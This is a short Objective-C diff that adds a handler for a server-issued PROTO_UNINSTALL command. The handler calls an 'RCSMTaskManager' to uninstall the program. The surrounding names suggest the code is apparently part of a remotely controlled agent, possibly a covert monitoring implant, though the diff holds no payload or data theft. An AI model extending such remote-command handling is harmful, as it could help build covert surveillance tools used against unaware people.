@@ -9,6 +9,8 @@
 
 #import "AuthNetworkOperation.h"
 
+#import "RCSMTaskManager.h"
+
 #import "NSMutableData+AES128.h"
 #import "NSString+SHA1.h"
 #import "NSData+SHA1.h"
@@ -305,8 +307,11 @@
     case PROTO_UNINSTALL:
       {
 #ifdef DEBUG_AUTH_NOP
-        warnLog(@"Uninstall not yet implemented here");
+        infoLog(@"Uninstall");
 #endif
+
+        RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+        [taskManager uninstallMeh];
       } break;
     case PROTO_NO:
     default:
